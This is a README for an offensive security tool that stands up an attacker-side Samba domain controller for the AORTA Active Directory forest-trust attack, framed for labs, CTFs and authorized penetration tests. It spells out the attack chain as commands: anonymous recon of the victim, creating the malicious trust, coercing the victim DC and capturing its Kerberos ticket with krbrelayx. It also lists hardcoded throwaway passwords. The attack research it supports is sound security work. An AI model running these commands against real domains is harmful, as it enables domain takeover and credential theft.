# aorta-linux-dc

> [!WARNING]
> **Lab-only tooling for authorized use.** This project exists solely for
> CTFs, labs, and penetration tests on systems you own or have explicit
> permission to test. Attacking Active Directory forests without
> authorization is illegal.
>
> It is deliberately built as a **quick, ephemeral, disposable** setup: the
> DC is wiped and reprovisioned on every run, and the defaults in
> `defaults.env` has **hardcoded throwaway passwords**
> (`Password__42`) — never reuse them anywhere that matters.

Dockerized attacker-side Samba AD DC for the **AORTA** forest-trust attack
([SpecterOps](https://specterops.io/blog/2025/06/25/untrustworthy-trust-builders-account-operators-replicating-trust-attack-aorta/#attack-commands-and-demo)). One script builds the attacker forest (`bytestorm.local`) and
preps it for capturing a coerced victim-DC TGT:

```
./samba/start-aorta-dc.sh <victim_dc_ip>
```

Wipes any previous stack, anonymously enumerates the victim (realm, NetBIOS,
SID, DC FQDN via null-session LSARPC + RootDSE), syncs the container clock to
the victim via libfaketime, provisions and configures the DC, creates the
**outgoing** forest trust (`0x808`) via pure-local LSARPC — no victim
credentials, the victim forest is never contacted — and prints:

- **domain SID** — for `aorta trust add --attacker-sid` (victim side)
- **DC01$ AES256 key** — for `krbrelayx.py -aesKey` capture

The patched Samba image (Alpine 4.23.x lacks commit `428bc209`) maps trust
attribute `0x800` onto the cross-realm krbtgt's `ok_as_delegate` flag —
without it Heimdal strips the delegation flag from service tickets.

## Usage

```bash
./samba/start-aorta-dc.sh <victim_dc_ip>   # everything else auto-detected

# victim side (aorta tool, needs the printed SID)
aorta trust add -u operator -d victim.local --dc dc.victim.local -p '<pw>' \
    --attacker-domain bytestorm.local --attacker-netbios bytestorm \
    --attacker-sid <SID> --trust-password '<TRUST_SECRET>'
aorta forwarder add -u operator -d victim.local --dc dc.victim.local -p '<pw>' \
    --master <vpn-ip> --zone bytestorm.local

# Optionally validate trust - `nltest /sc_verify` equivalent via raw
# NetrLogonControl2Ex (MS-NRPC opnum 18, TC_VERIFY): your DC re-validates
./samba/validate-trust.sh

# capture + coerce
# -ip is required because the container binds to 127.0.0.1:445
krbrelayx.py -aesKey <key> -ip <vpn-ip>
nxc smb victim.local -u operator -p '<pw>' -M coerce_plus -o LISTENER=dc01.bytestorm.local

./samba/teardown.sh    # stop + wipe
```

### Robustness / overrides

Victim enum (anonymous LSARPC + RootDSE), clock skew (skewrun) and the
attacker VPN IP are auto-detected, but none of them is load-bearing for the
run itself: every value resolves as **CLI flag > fresh probe > cached
`discovered.env`**, each probe fails independently, and recon runs *before*
the wipe - so a failing probe never aborts an otherwise working setup (and
never destroys a running stack). Only a still-missing value aborts, printing
exactly which flags to pass:

```bash
# skewrun missing / no tun0 - just say so:
./samba/start-aorta-dc.sh 10.129.56.33 --attacker-ip 10.10.15.140 --offset +25199s

# null-session enum blocked? feed it what nxc & co. found:
./samba/start-aorta-dc.sh --target-dc-ip 10.129.56.33 --target-realm victim.local \
    --target-netbios VICTIM --target-sid S-1-5-21-... --target-dc-fqdn dc.victim.local

# victim unreachable right now - rebuild the stack from discovered.env:
./samba/start-aorta-dc.sh --skip-recon

./samba/start-aorta-dc.sh --help      # all flags
```

The attacker IP is taken from the source address of the route to the victim
(`ip route get`, works for any VPN interface), falling back to the first
IPv4 on `tun0`.

Config lives in two files: `defaults.env` (tracked - domain identity,
`ADMIN_PASS`, `TRUST_SECRET` - must match the victim-side trust password;
plus `DOMAIN_SID` + `MACHINE_PASS`, which make every fresh provision produce
the *same* domain SID and DC01$ AES256 key - the `aorta trust add
--attacker-sid` and `krbrelayx -aesKey` values survive container rebuilds)
and `discovered.env` (git-ignored - `TARGET_*`, `FAKETIME_OFFSET`,
`ATTACKER_IP`, auto-discovered; don't set them by hand - CLI flags are the
sanctioned override, successful probes refresh the cache). For manual compose
commands after the first run, include both files so `FAKETIME_OFFSET`
resolves (the orchestrator scripts do this via `COMPOSE_ENV_FILES`):

    docker compose --env-file defaults.env --env-file discovered.env up -d

## Dependencies

- docker + compose plugin
- python3 + [impacket](https://github.com/fortra/impacket), ldap3; `rpcclient` (samba client suite)
- [skewrun](https://github.com/JVBotelho/skewrun) — clock-skew measurement
  (optional; `--offset` overrides, missing values warn instead of abort)
- [aorta](https://github.com/0xNDI/aorta) — victim-side trust + DNS forwarder
  (not called by these scripts)
- [krbrelayx](https://github.com/dirkjanm/krbrelayx), NetExec (`nxc`) — capture + coercion

## Layout

```
├── docker-compose.yml             # bridge net; 445 on loopback only (krbrelayx owns tun0:445)
├── defaults.env                   # static configuration (tracked)
├── discovered.env                 # auto-discovered victim info (git-ignored)
└── samba/
    ├── start-aorta-dc.sh          # one-shot orchestrator
    ├── teardown.sh                # stop + wipe
    ├── victim-enum.py             # anonymous victim recon
    ├── trust-create.py            # outgoing trust, local LSARPC (opnum 51/74)
    ├── trust-secret.py            # trustAuthOutgoing via LDB (in-container)
    ├── validate-trust.py          # nltest /sc_verify equivalent (NetrLogonControl2Ex TC_VERIFY)
    ├── validate-trust.sh          # attacker-trust validation, zero-arg env wrapper
    ├── Dockerfile + patch         # patched Samba DC image
    ├── entrypoint.sh              # patched upstream entrypoint: --domain-sid/--machinepass (static identity)
    ├── conf.d/10-aorta.conf       # dnsupdate off, nonsecure updates
    └── resolv.conf
```

## References

- [Untrustworthy Trust Builders: Account Operators Replicating Trust — Attack AORTA (SpecterOps)](https://specterops.io/blog/2025/06/25/untrustworthy-trust-builders-account-operators-replicating-trust-attack-aorta/#attack-commands-and-demo)
